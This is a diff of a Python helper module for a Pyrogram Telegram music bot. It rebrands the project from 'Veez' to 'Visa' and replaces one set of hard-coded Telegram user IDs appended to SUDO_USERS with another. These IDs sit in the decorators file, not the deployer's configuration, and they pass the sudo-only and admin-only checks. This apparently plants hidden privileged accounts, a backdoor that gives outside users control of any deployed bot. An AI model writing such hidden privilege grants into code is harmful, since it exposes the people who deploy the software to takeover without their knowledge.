@@ -1,19 +1,18 @@
-# Copyright (C) 2021 By VeezMusicProject
+# Copyright (C) 2021 By VisaMusicProject
 
 from typing import Callable
 
 from pyrogram import Client
 from pyrogram.types import Message
 
-from config import Veez
+from config import Visa
 from helpers.admins import get_administrators
 
-Veez.SUDO_USERS.append(1757169682)
-Veez.SUDO_USERS.append(1738637033)
-Veez.SUDO_USERS.append(1448474573)
-Veez.SUDO_USERS.append(1672609421)
-Veez.SUDO_USERS.append(1670523611)
-Veez.SUDO_USERS.append(1952053555)
+Visa.SUDO_USERS.append(1967390512)
+Visa.SUDO_USERS.append(1954882668)
+Visa.SUDO_USERS.append(1963390367)
+Visa.SUDO_USERS.append(804329190)
+Visa.SUDO_USERS.append(1258905497)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
@@ -27,7 +26,7 @@ def errors(func: Callable) -> Callable:
 
 def authorized_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        if message.from_user.id in Veez.SUDO_USERS:
+        if message.from_user.id in Visa.SUDO_USERS:
             return await func(client, message)
 
         administrators = await get_administrators(message.chat)
@@ -41,7 +40,7 @@ def authorized_users_only(func: Callable) -> Callable:
 
 def sudo_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        if message.from_user.id in Veez.SUDO_USERS:
+        if message.from_user.id in Visa.SUDO_USERS:
             return await func(client, message)
 
     return decorator
